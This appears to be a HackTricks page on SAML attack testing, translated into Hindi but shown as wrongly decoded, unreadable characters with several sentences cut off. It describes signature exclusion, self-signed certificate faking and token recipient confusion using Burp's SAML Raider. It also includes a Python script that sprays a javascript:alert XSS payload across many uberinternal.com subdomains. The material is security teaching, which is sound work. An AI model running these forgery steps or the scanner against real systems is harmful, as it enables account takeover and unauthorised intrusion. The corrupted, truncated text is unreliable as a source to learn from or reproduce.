рдЖрдк Burp рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SAML рдЕрдиреБрд░реЛрдз рд╕реЗ POC рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╕рдВрднрд╛рд╡рд┐рдд XSLT рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдЗрд╕ рд╡рд╛рд░реНрддрд╛ рдХреЛ рднреА рджреЗрдЦреЗрдВ: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдирд┐рд╖реНрдХрд╛рд╕рди <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдирд┐рд╖реНрдХрд╛рд╕рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдпрд╣ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ SAML рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди **рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рддрддреНрд╡ рдХреЗ рдЕрднрд╛рд╡** рдореЗрдВ рдХреИрд╕реЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рддрд╛ рд╣реИред рдЬрдм рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рддрддреНрд╡ **рдЕрдиреБрдкрд╕реНрдерд┐рдд** рд╣реЛрддрд╛ рд╣реИ, рддреЛ **рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╕рддреНрдпрд╛рдкрди рдЪрд░рдг рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЫреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдпрджрд┐ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдкреБрд╖реНрдЯрд┐ рдирд╣реАрдВ рдХреА рдЬрд╛рддреА рд╣реИ, рддреЛ рдЙрди рд╕рднреА рд╕рд╛рдордЧреНрд░рд┐рдпреЛрдВ рдХреЛ рдЬреЛ рдЖрдорддреМрд░ рдкрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╣реЛрддреА рд╣реИрдВ, рдЙрдиреНрд╣реЗрдВ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

![](<../../.gitbook/assets/image (547).png>)

### рдЙрдкрдХрд░рдг <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдирд┐рд╖реНрдХрд╛рд╕рди SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ `Remove Signatures` рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддрд╛ рд╣реИред рдРрд╕рд╛ рдХрд░рдиреЗ рд╕реЗ **рд╕рднреА** рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рддрддреНрд╡ рд╣рдЯрд╛ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

![sig-exclusion](https://epi052.gitlab.io/notes-to-self/img/saml/sig-exclusion.png)

рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреЛ рд╣рдЯрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рдЕрдиреБрд░реЛрдз рдХреЛ рд▓рдХреНрд╖реНрдп рдХреА рдУрд░ рдмрдврд╝рдиреЗ рджреЗрдВред рдпрджрд┐ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реИ

## рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирдХрд▓реАрдХрд░рдг <a href="#certificate-faking" id="certificate-faking"></a>

рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирдХрд▓реАрдХрд░рдг рдпрд╣ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ **рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ рдиреЗ SAML рд╕рдВрджреЗрд╢ рдкрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд┐рдП рд╣реИрдВред** SP рдФрд░ IdP рдХреЗ рдмреАрдЪ рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╕рдВрдмрдВрдз рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ **рд╣рд░ рдмрд╛рд░ рдЬрдм SAML рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рддреЛ рдЗрд╕реЗ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ **рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд** рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдпрд╛ рджрд╛рд╡реЗ рдкрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдирд╛ред

### рдЙрдкрдХрд░рдг <a href="#certificate-faking-how-to" id="certificate-faking-how-to"></a>

Burp рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред\
рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирдХрд▓реАрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░рдиреЗ рд╕реЗ рд╢реБрд░реВ рдХрд░реЗрдВред\
рдпрджрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╢рд╛рдорд┐рд▓ рд╣реИ, рддреЛ `Send Certificate to SAML Raider Certs` рдмрдЯрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

![send-cert](https://epi052.gitlab.io/notes-to-self/img/saml/send-cert.png)

рдкреНрд░рдорд╛рдгрдкрддреНрд░ рднреЗрдЬрдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдореЗрдВ SAML Raider рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреИрдм рдореЗрдВ рдПрдХ рдЖрдпрд╛рддрд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рджрд┐рдЦрд╛рдИ рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдПред рд╡рд╣рд╛рдВ рдкрд╣реБрдВрдЪрдиреЗ рдкрд░, рд╣рдо рдЖрдпрд╛рддрд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ рд╣рд╛рдЗрд▓рд╛рдЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ `Save and Self-Sign` рдмрдЯрди рджрдмрд╛рддреЗ рд╣реИрдВред

![sent-cert](https://epi052.gitlab.io/notes-to-self/img/saml/sent-cert.png)

рдРрд╕рд╛ рдХрд░рдиреЗ рд╕реЗ рдореВрд▓ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рдПрдХ рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХреНрд▓реЛрди рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИред рдЕрдм рдпрд╣ рд╕рдордп рд╣реИ рдХрд┐ рдмрд░реНрдк рдХреЗ рдкреНрд░реЙрдХреНрд╕реА рдореЗрдВ рдЕрднреА рднреА рд░реБрдХреЗ рд╣реБрдП рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд┐рдП рдЧрдП рдЕрдиреБрд░реЛрдз рдкрд░ рд╡рд╛рдкрд╕ рдЬрд╛рдПрдВред рдкрд╣рд▓реЗ, XML рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдбреНрд░реЙрдкрдбрд╛рдЙрди рдореЗрдиреВ рд╕реЗ рдирдП рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред рдлрд┐рд░ `Remove Signatures` рдмрдЯрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА рдореМрдЬреВрджрд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреЛ рд╣рдЯрд╛ рджреЗрдВред рдЕрдВрдд рдореЗрдВ, **`(Re-)Sign Message`** рдпрд╛ `(`**`Re-)Sign Assertion`** рдмрдЯрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (**рдЬреЛ рднреА** рдЖрдкрдХреА рджреА рдЧрдИ рд╕реНрдерд┐рддрд┐ рдореЗрдВ **рдЕрдзрд┐рдХ** **рдЙрдкрдпреБрдХреНрдд** рд╣реЛ)ред

![remove-sig](https://epi052.gitlab.io/notes-to-self/img/saml/remove-sig.png)

рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рд╕рдВрджреЗрд╢ рдкрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдЗрд╕реЗ рднреЗрдЬ рджреЗрдВред рдпрджрд┐ рд╣рдо рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рд╣рдо рдЕрдкрдиреЗ SAML рд╕рдВрджреЗрд╢реЛрдВ рдкрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдкрдиреЗ SAML рд╕рдВрджреЗрд╢реЛрдВ рдкрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рджрд╛рд╡реЗ рдореЗрдВ рдорд╛рдиреЛрдВ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡реЗ рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗред

## рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рднреНрд░рдо / рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рд▓рдХреНрд╖реНрдп рднреНрд░рдо <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рднреНрд░рдо / рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рд▓рдХреНрд╖реНрдп рднреНрд░рдо **рдпрд╣ рдкрд░реАрдХреНрд╖рдг рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдпрджрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рдХреЗ рд▓рд┐рдП рдереА**, рддреЛ **рд╡рд░реНрддрдорд╛рди** рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рдХреЛ рдЗрд╕реЗ рдиреЛрдЯрд┐рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП**ред\
**рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛** рдХреНрд╖реЗрддреНрд░ **SubjectConfirmationData** рддрддреНрд╡ рдХрд╛ рдПрдХ рдЧреБрдг рд╣реИ, рдЬреЛ SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╡рд┐рд╖рдп рддрддреНрд╡ рдХрд╛ рдПрдХ рдмрдЪреНрдЪрд╛ рд╣реИред

> SubjectConfirmationData рддрддреНрд╡ рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╡рд┐рд╖рдп рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдпрд╛ рд╡рд┐рд╖рдп рдкреБрд╖реНрдЯрд┐ рдХреА рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рддрд╛ рд╣реИред рд╡рд┐рд╖рдп рдкреБрд╖реНрдЯрд┐ рддрдм рд╣реЛрддреА рд╣реИ рдЬрдм рдПрдХ рднрд░реЛрд╕реЗрдордВрдж рдкрдХреНрд╖ рджрд╛рд╡реЗ рдХреЗ рд╡рд┐рд╖рдп рдХреЗ рдмреАрдЪ рд╕рдВрдмрдВрдз рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ (рдпрд╛рдиреА, рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реА рдЗрдХрд╛рдИ)ред

**SubjectConfirmationData рддрддреНрд╡ рдкрд░ рдкрд╛рдпрд╛ рдЧрдпрд╛ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдЧреБрдг рдПрдХ URL рд╣реИ рдЬреЛ рдЙрд╕ рд╕реНрдерд╛рди рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рджрд╛рд╡реЗ рдХреЛ рдкрд╣реБрдВрдЪрд╛рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**ред рдпрджрд┐ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдЙрд╕ рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рд╕реЗ рдЕрд▓рдЧ рд╣реИ рдЬреЛ рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рджрд╛рд╡реЗ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

### рдХреИрд╕реЗ рдХрд░реЗрдВ <a href="#token-recipient-confusion-how-to" id="token-recipient-confusion-how-to"></a>

SAML рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рднреНрд░рдо (SAML-TRC) рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ рд╢реЛрд╖рдг рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдкреВрд░реНрд╡ рд╢рд░реНрддреЗрдВ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред рдкрд╣рд▓реЗ, рд╣рдореЗрдВ **рдПрдХ рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рдкрд░ рдПрдХ рд╡реИрдз рдЦрд╛рддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**ред рджреВрд╕рд░рд╛, **SP-Target рдХреЛ рдЙрд╕реА рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ рджреНрд╡рд╛рд░рд╛ рдЬрд╛рд░реА рдХрд┐рдП рдЧрдП рдЯреЛрдХрди рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдЪрд╛рд╣рд┐рдП рдЬреЛ SP-Legit рдХреА рд╕реЗрд╡рд╛рдПрдВ рджреЗрддрд╛ рд╣реИ**ред

рдпрджрд┐ рд╢рд░реНрддреЗрдВ рд╕рдЪ рд╣реИрдВ рддреЛ рд╣рдорд▓рд╛ рдЕрдкреЗрдХреНрд╖рд╛рдХреГрдд рд╕рд░рд▓ рд╣реИред рд╣рдо **SP-Legit** рдХреЛ рд╕рд╛рдЭрд╛ рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рддреЗ рд╣реИрдВ**ред рдлрд┐рд░ рд╣рдо **IdP рд╕реЗ SP-Legit рдХреЗ рд▓рд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реА SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░рддреЗ рд╣реИрдВ**ред рдПрдХ рдмрд╛рд░ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо **SP-Legit рдХреЗ рд▓рд┐рдП рдЗрд░рд╛рджрд╛ SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ SP-Target рдХреЗ рдмрдЬрд╛рдп рднреЗрдЬрддреЗ рд╣реИрдВред** рдпрджрд┐ **SP-Target рджрд╛рд╡реЗ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ**; рд╣рдо рдЦреБрдж рдХреЛ SP-Legit рдХреЗ рд▓рд┐рдП рдЙрд╕реА рдЦрд╛рддрд╛ рдирд╛рдо рдХреЗ рд╕рд╛рде рд▓реЙрдЧ рдЗрди рдкрд╛рдПрдВрдЧреЗ рдФрд░ SP-Target рдХреЗ рд╕рдВрдмрдВрдзрд┐рдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВрдЧреЗред

## рд▓реЙрдЧрдЖрдЙрдЯ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдореЗрдВ XSS

([рдореВрд▓ рд╢реЛрдз рдпрд╣рд╛рдВ рджреЗрдЦреЗрдВ](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-sub
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
рдпрд╣ рдПрдХ рд▓реЙрдЧрдЖрдЙрдЯ рдкреЗрдЬ рд╣реИ, рдореИрдВрдиреЗ рдКрдкрд░ рджрд┐рдП рдЧрдП рд▓рд┐рдВрдХ рдХреЛ рдЦреЛрд▓рд╛ рдФрд░ рдпрд╣ рдореБрдЭреЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрдЬ рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░ рджрд┐рдпрд╛ред
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
### рд╕рд╛рдореВрд╣рд┐рдХ рд╢реЛрд╖рдг

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдЬреЛ рдпреВрдЖрд░рдПрд▓ рдХреА рд╕реВрдЪреА рд▓реЗ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЖрдкрдХреЛ рд╡рд╛рдкрд╕ рдХреЙрд▓рдмреИрдХ (SAML consume) рдпреВрдЖрд░рдПрд▓ рджреЗрддрд╛ рд╣реИ, рдореИрдВрдиреЗ `uberinternal.com` рдХреЗ рд╕рднреА рд╕рдмрдбреЛрдореЗрдиреНрд╕ рдХреЛ рдЗрд╕ рдЙрдкрдХрд░рдг рдореЗрдВ рдбрд╛рд▓рдиреЗ рдХрд╛ рдирд┐рд░реНрдгрдп рд▓рд┐рдпрд╛ рддрд╛рдХрд┐ рджреЗрдЦ рд╕рдХреВрдБ рдХрд┐ рдХреНрдпрд╛ рдЕрдиреНрдп рдбреЛрдореЗрдиреНрд╕ рднреА рдЙрд╕реА рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдФрд░ рд╡рд╣рд╛рдБ рдереЗред

рдЬреЛ рдореИрдВрдиреЗ рдЕрдЧрд▓рд╛ рдХрд┐рдпрд╛ рд╡рд╣ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рдирд╛ рдерд╛ рдЬреЛ рдХрдордЬреЛрд░ рдкреЗрдЬ `oidauth/prompt` рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ рдФрд░ XSS рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЕрдЧрд░ рдореЗрд░рд╛ рдЗрдирдкреБрдЯ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрддрд╛ рд╣реИ рддреЛ рдпрд╣ рдореБрдЭреЗ рдПрдХ рдЕрдЪреНрдЫрд╛ рдХрдордЬреЛрд░ рд╕рдВрджреЗрд╢ рджреЗрддрд╛ рд╣реИред
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## рд╕рдВрджрд░реНрдн

рдпреЗ рд╣рдорд▓реЗ [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЧрдП рдереЗред\
рдЖрдк рдЕрддрд┐рд░рд┐рдХреНрдд рд╕рдВрд╕рд╛рдзрди рдФрд░ рд▓реЗрдЦрди [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/) рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВред**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
